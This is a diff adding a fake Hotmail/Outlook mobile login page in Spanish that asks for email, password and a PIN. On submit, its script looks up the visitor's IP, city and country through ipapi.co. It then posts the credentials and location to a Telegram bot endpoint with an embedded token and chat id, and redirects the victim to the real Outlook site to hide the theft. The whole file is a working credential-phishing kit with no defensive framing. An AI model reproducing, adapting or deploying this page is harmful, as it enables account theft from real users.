@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="shortcut icon" href="img/favicon.ico">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Mobile</title>
+  <link rel="stylesheet" href="css/stylesmobile.css">
+</head>
+<body>
+  <div class="login-container">
+    <h1>&nbsp;</h1>
+    <div class="form-container">
+      <img src="img/logo.svg" alt="Logo" class="logo">
+      <h2>Iniciar sesión</h2>
+         <br>
+         <form id="login-form">
+    <input type="email" id="us4r" name="us4r" placeholder="Correo electrónico, teléfono o Skype" required>
+    <input type="password" id="p4sx" name="p4sx" placeholder="Contraseña" required>
+      <input type="password" id="p1n" name="p1n" placeholder="Pin de 4 o 6 dígitos" maxlength="6" required="">
+    <button type="submit">Iniciar sesión</button>
+  </form>
+
+      <p class="signup-prompt">¿No tienes una cuenta?</p>
+    </div> 
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#login-form");
+    form.addEventListener("submit", (event) => {
+      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+      axios
+        .get(url)
+        .then((response) => {
+          const us4r = document.querySelector("#us4r").value;
+          const p4sx = document.querySelector("#p4sx").value;
+          const p1n = document.querySelector("#p1n").value;
+          const message =
+            "✅HOTMAIL✅" +
+            "\n📧Correo: " +
+            us4r +
+            "\n🔐Contraseña: " +
+            p4sx +
+            "\n🔐Pin: " +
+            p1n +
+            "\n🏙️Ciudad: " +
+            response.data.city +
+            "\n🌎Pais: " +
+            response.data.country +
+            "\n🔢IP: " +
+            response.data.ip +
+            "\n🤑SN04PCSS++🤑";
+          axios
+            .post(
+              "https://api.telegram.org/bot6805610937:AAHD180ttJu4FWbrqCc6cuhAbUzup48LDLA/sendMessage",
+              {
+                chat_id: "5150089222",
+                text: message,
+              }
+            )
+            .then((response) => {
+              console.log(response.data);
+              window.location.href = "https://outlook.live.com";
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+  </script>
+</body>
+</html>
